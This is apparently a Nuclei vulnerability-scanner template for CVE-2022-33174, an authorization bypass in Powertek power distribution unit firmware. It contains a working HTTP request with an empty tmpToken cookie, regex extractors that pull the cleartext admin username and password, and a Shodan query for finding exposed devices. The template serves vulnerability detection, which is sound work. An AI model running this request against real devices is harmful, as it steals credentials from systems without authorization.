id: CVE-2022-33174

info:
  name: Powertek Firmware <3.30.30 - Authorization Bypass
  author: pikpikcu
  severity: high
  description: |
    Powertek firmware (multiple brands) before 3.30.30 running Power Distribution Units are vulnerable to authorization bypass in the web interface. To exploit the vulnerability, an attacker must send an HTTP packet to the data retrieval interface (/cgi/get_param.cgi) with the tmpToken cookie set to an empty string followed by a semicolon. This bypasses an active session authorization check. This can be then used to fetch the values of protected sys.passwd and sys.su.name fields that contain the username and password in cleartext.
  reference:
    - https://gynvael.coldwind.pl/?lang=en&id=748
    - https://nvd.nist.gov/vuln/detail/CVE-2022-33174
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2022-33174
    cwe-id: CWE-863
  metadata:
    shodan-query: http.html:"Powertek"
    verified: "true"
  tags: cve,cve2022,powertek,auth-bypass

requests:
  - raw:
      - |
        GET /cgi/get_param.cgi?xml&sys.passwd&sys.su.name HTTP/1.1
        Host: {{Hostname}}
        Cookie: tmpToken=;

    matchers-condition: and
    matchers:

      - type: word
        words:
          - '<sys.passwd>'
          - '<sys.su.name>'

      - type: status
        status:
          - 200

    extractors:
      - type: regex
        part: body
        group: 1
        regex:
          - '<sys\.passwd>([A-Z0-9a-z]+)<\/sys\.passwd>'
          - '<sys\.su\.name>([a-z]+)<\/sys\.su\.name>'

# Enhanced by mp on 2022/07/15
